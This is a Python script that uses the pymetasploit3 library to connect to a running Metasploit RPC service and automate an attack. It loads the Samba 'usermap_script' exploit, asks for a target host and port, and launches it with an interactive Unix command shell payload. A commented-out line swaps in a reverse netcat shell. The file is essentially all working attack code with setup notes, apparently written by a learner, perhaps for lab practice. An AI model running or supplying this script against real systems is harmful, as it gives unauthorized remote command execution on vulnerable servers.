#! /usr/bin/python3

from pymetasploit3.msfrpc import MsfRpcClient

print('\nMake sure MSF is running on another tab.\n')
print('In termial type:\n\n msfconsole \n load msgrpc [pass=yourpasswd] \n')

print('Take note of MSGRPC Password.\n')

PASSWORD = input('Enter your password: ')
client = MsfRpcClient(PASSWORD, port=55552, ssl=False)

'''
INSTRUCTIONS:
    1. Set the exploit .modules.use('exploit', EXPLOIT_PATH)
    2. Check required options with .missing_required
        a. For all options use .options
        b. Check option values use .runoptions
    3. Set RHOSTS with [RHOSTS]
    4. Check exploit payloads with .targetpayloads()
    5. Set a payload with .modules.use('payload', PAYLOAD_PATH)
        a. Step 2 sub steps apply here
    6. Set LHOST with [LHOST]
    7. Excute the exploit with .execute(payload)
    8. Exploit successful if job_id == 1 and failed if we got None

THOUGHTS:
    Not all payloads and exploits will have easy to configure options so 
    perhaps it's best to sort through the ones that just need a host or port 
    confirgured and look at the more complicated ones later.

'''

exploit = client.modules.use('exploit', 'multi/samba/usermap_script')

#print(exploit.description, '\n')

#print(exploit.options)

print('Missing required options')
print(exploit.missing_required, '\n')

rhosts = input('Set RHOSTS: ')
exploit['RHOSTS'] = rhosts
rport = input('Set RPORT: ')
exploit['RPORT'] = rport

consoleID = client.consoles.console().cid
console = client.consoles.console(consoleID)
print(console.run_module_with_output(exploit, payload='cmd/unix/interact'))

#payloads = exploit.targetpayloads()
'''
for payload in payloads:
    print(payload)
'''
#print(exploit.execute(payload='cmd/unix/reverse_netcat')`)

